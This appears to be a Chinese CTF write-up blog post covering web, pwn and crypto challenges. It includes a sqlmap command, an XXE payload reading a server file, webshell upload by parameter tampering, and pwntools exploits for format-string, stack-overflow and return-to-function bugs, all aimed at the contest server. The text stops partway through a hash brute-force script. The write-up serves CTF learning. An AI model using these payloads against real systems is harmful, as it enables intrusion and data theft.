    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>这两天在打一个稍微简单的CTF，写个writeup记录一下被虐的过程😭，总的来说这场小赛是个大杂烩，毕竟你懂的😏，作为做题者我们当然是有题做就ok的。</p><p>由于比赛后环境关闭，所以有的无图片展示，现有的图片是下午就准备写writeup截的图。</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-签到题"><a href="#web1-签到题" class="headerlink" title="web1-签到题"></a>web1-签到题</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>跟某几个ctf练习平台上面的滑稽题一样：</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>一键获取flag😄。</p><h3 id="web2-输入密码查看flag"><a href="#web2-输入密码查看flag" class="headerlink" title="web2-输入密码查看flag"></a>web2-输入密码查看flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>简单浏览一下，就是一个爆破的题：</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>密码为五位数，那我们直接上burpsuite咯：设置长度和payload字符：</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-这真能传马？"><a href="#web3-这真能传马？" class="headerlink" title="web3-这真能传马？"></a>web3-这真能传马？</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>简单地抓包修改参数，从而使得自己能够传php，我直接上了一个大马，然后看/opt/flag.txt。</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>抓包可以看到url中的ext参数传递的是文件类型，猜测是可以修改，我们加个php到中间即可成功地直接上传webshell（很抠脚）。</p><p><img src="https://i.loli.net/2018/10/28/5bd56da602535.png" alt=""></p><p>然后再修改一下content-type即可：</p><p><img src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" alt=""></p></blockquote><p>To /opt/flag.txt  get flag==&gt;😄</p><p><img src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" alt=""></p><h3 id="web4-这真能注入？"><a href="#web4-这真能注入？" class="headerlink" title="web4-这真能注入？"></a>web4-这真能注入？</h3><p>题目链接</p><blockquote><p>浏览一下，加个单引号试试就一个很明显的注入咯：</p><p><img src="https://i.loli.net/2018/10/28/5bd56f5203775.png" alt=""></p><p>直接sqlmap注入即可，<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>得到数据库名后直接逐步指定数据库表，指定字段，dump即可。</p><p>由于比赛后服务已经关闭故未能截取成功图片。</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>这题是xxe外部实体注入，通过抓包，修改POST数据以及Content-type从而读取到/tmp/flag.txt。</p><blockquote><p>XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，从而读取敏感文件内容。</p></blockquote><p>题目原本传输的<code>Content-type: application/json</code>改为<code>Content-type: application/xml</code>，并将POST的数据改为以下xml代码:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=”1.0″?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM “file:///tmp/flag.txt”></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>然后发送数据包，就可得到api返回的flag了。</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>这道题有点东西，一步一步深入，到最后一个提示放出之后几分钟，迅速拿到flag。</p><p>步骤：登录和注册界面需要写脚本抛出对应规则的code，然后通过目录遍历得到部分页面源码以及一个目录(分别是<code>user.php~</code>， <code>config.php~</code>，<code>adminpic</code>)，根据源码可以得知adminpic是admin用户上传文件的一个目录，并且我们可以得到数据库账号密码，全端口扫描得到23306端口为数据库服务端口，登陆后得到admin账户密码，经过大半天的破解md5之后，得到提示<code>crypto.html</code>，这是一个指定的解密md5的页面，输入admin密码hash值破解得到提示<code>crypto.png</code>，访问得到二维码，扫描即可获得密码<code>wandouxueyuan:)</code>，用此密码可登录admin账户，来到上传图片publish页面，结合前面遍历得到的一个<code>adminpic</code>目录可以知道上传文件在此目录中，经过简单的绕过后上传大马即可。</p><p>傻傻的我还尝试文件包含，session_decode，以及register注册等等操作。</p><p><img src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" alt=""></p></blockquote><p><img src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" alt=""></p><p>传完马后访问/adminpic目录即可看到自己上传的文件，从而getshell拿到flag：</p><p><img src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" alt=""></p><h3 id="web附加题-atom"><a href="#web附加题-atom" class="headerlink" title="web附加题-atom"></a>web附加题-atom</h3><blockquote><p>这道web加餐题，实际上就是用给的账户密码登录后将cookie中的<code>admin=0</code>改为<code>admin=1</code>，然后会跳转到一个后台，然后查看后台源码即可得到真正的flag。</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>三个pwn都非常经典，分别考察格式化字符串漏洞，简单的溢出，以及ret2sys几个知识点。</p></blockquote><h3 id="pwn1–格式化字符串漏洞"><a href="#pwn1–格式化字符串漏洞" class="headerlink" title="pwn1–格式化字符串漏洞"></a>pwn1–格式化字符串漏洞</h3><p>通过用IDA简单地分析一下逻辑，可以看到printf处存在格式化字符串漏洞：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_fun函数伪c代码</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//格式化字符串漏洞</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//覆盖got表中fflush条目指向的地址，将其指向read_flag函数</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单运行一下，我们可以构造语句：<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>，然后输入得到：</p><p><img src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" alt=""></p><p>可以看到我们的输入被放在了printf函数栈中的第6个位置（这里的%p是c/c++中格式化字符串的参数），格式化字符串漏洞最主要的危害就是可以获取任意地址内容，或者实现任意地址写，那么我们这就是通过任意地址写，来覆盖got表，之前的<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">练习记录</a>中就提到了这些知识。</p><p>既然知道了利用位置，那么直接利用pwntools构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#覆盖fflush地址指向的内容，从而实现read_flag跳转</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp效果：</p><p><img src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" alt=""></p><h3 id="pwn2–栈溢出"><a href="#pwn2–栈溢出" class="headerlink" title="pwn2–栈溢出"></a>pwn2–栈溢出</h3><blockquote><p>简单的栈溢出啦，很常见的，找到溢出点然后把EIP指向我们的<code>win</code>函数地址即可:</p><p><img src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" alt=""></p><p>通过<code>gdb-peda</code>,pattern模块，找到溢出偏移量为76，也就是说只需要构造<code>76*&#39;a&#39; + win_addr</code>即可:</p><p><img src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" alt=""></p></blockquote><p>构造exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#ida中有win函数的地址</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果(因为环境已经关闭，所以只能展示本地效果):</p><p><img src="https://i.loli.net/2018/10/28/5bd5a99272847.png" alt=""></p><h3 id="pwn3–ret2syscall"><a href="#pwn3–ret2syscall" class="headerlink" title="pwn3–ret2syscall"></a>pwn3–ret2syscall</h3><blockquote><p>pwn3的话稍微比上面两题要难上一点点，不过还在我这个萌新的承受范围之内，先检查一下保护措施：</p><p><img src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" alt=""></p><p>可以看到只是开了栈不可执行 （NX)，静态分析一波:</p><p><img src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" alt=""></p><p>这里我们也可以看到一个win_func函数，猜测同样是利用返回到该函数从而得到flag，那么如何返回到这个win_func函数呢？</p><p>我们注意到mem_test函数伪c代码如下:</p><p><img src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" alt=""></p><p>直接<code>return result</code>，那么如果有溢出存在，那我们能不能覆盖掉这个函数的返回地址呢，那当然是可行的(这题不能直接用pattern create得到偏移量，如果pattern过大则会导致无法覆盖eip），用gdb在mem_test函数下断点调试：</p><p><img src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" alt=""></p><p>然后根据之前ida分析变量s的位置为<code>ebp-0x13</code>,我们可以知道，<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>，或者直接在gdb看ebp的值，可以知道<code>0x8048718</code>就是return返回的地址。我们需要将它覆盖成win_func的地址。</p><p><img src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" alt=""></p><p>而catflag地址就是一开始输出的那个hint:<code>0x080487E0</code></p></blockquote><p>构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#padding由栈空间和ebp(0x13+4)组成，system('cat flag')由system函数和catflag参数以及system返回地址组成</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" alt=""></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-我这密码忘了。。。"><a href="#Crypto1-我这密码忘了。。。" class="headerlink" title="Crypto1-我这密码忘了。。。"></a>Crypto1-我这密码忘了。。。</h3><blockquote><p>题面有一串base64：VTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>连续解码即可得到：SK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>提交即可。</p></blockquote><h3 id="Crypto2-二战时期的密码"><a href="#Crypto2-二战时期的密码" class="headerlink" title="Crypto2-二战时期的密码"></a>Crypto2-二战时期的密码</h3><blockquote><p>据说是某平台原题，甚至专门去查了一下二战时期的密码学，题面：</p><pre class=" language-c"><code class="language-c">已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>，请分析出flag</code></pre><p>WELCOMETOCFF为密钥，长度为12，而二进制串长度为84，既然密文为二进制，那么可以想到的比较简单的加密操作就是按位与，按位或，以及按位异或。</p><p>尝试后发现是异或操作，将WELCOMETOCFF，分别用七位二进制表示其在字母表中的顺序，并且每对应的七位进行异或操作：</p><pre class=" language-c"><code class="language-c">密文<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XOR密钥W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>得到：<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>提交即可。</p></blockquote><h3 id="Crypto3-被黑了，求密码"><a href="#Crypto3-被黑了，求密码" class="headerlink" title="Crypto3-被黑了，求密码"></a>Crypto3-被黑了，求密码</h3><blockquote><p>摩斯电码解码即可：</p><p><img src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" alt=""></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-出航了-出航啦！！"><a href="#Crypto4-出航了-出航啦！！" class="headerlink" title="Crypto4-出航了~出航啦！！"></a>Crypto4-出航了~出航啦！！</h3><blockquote><p>根据题面，尝试进行对请求类型进行过滤，发现POST请求只有一个，并且有userid和pswrd：</p><p><img src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" alt=""></p><p>尝试将pswrd的值解码后提交flag，成功。</p></blockquote><h3 id="Crypto5-IDC密码破解-未解出"><a href="#Crypto5-IDC密码破解-未解出" class="headerlink" title="Crypto5-IDC密码破解(未解出)"></a>Crypto5-IDC密码破解(未解出)</h3><blockquote><p>给出一串字符<code>js4163633181327481</code></p><p>完全脑洞题：手机九键<code>4163633181327481</code>，没用过的咋活。。。</p></blockquote><h3 id="Crypto6-超级密码"><a href="#Crypto6-超级密码" class="headerlink" title="Crypto6-超级密码"></a>Crypto6-超级密码</h3><blockquote><p>这题给出了大量的md5值，以及类似于base64格式的字符串，很容易就想到hash加盐(salt)的问题，而且隐约记得之前在哪看到过这个题。</p><p>脚本爆破（时间原因，直接从1234567880开始）：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token 